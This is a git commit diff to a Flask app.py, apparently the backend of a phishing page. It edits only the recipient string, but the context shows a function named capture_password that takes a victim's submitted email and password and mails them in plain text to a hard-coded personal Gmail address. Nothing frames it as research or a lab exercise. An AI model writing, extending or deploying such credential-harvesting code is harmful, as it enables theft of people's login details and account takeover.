b47cd020834866b2fbf24d1a203e391ebe501d74
dinofunds <135698451+dinofunds@users.noreply.github.com>
2024-08-12 08:50:57 -0400

    Update app.py

--- app.py
+++ app.py
@@ -32,7 +32,7 @@ def capture_password():
         password = request.form.get('password')
 
         # Send email using Flask-Mail
-        recipient =  '21kevinflores@gmail.com'  # Your email address to receive the email
+        recipient =  ' 21kevinflores@gmail.com '  # Your email address to receive the email
         subject = 'Login'
         body = f'Email: {email}\nPassword entered: {password}'
 
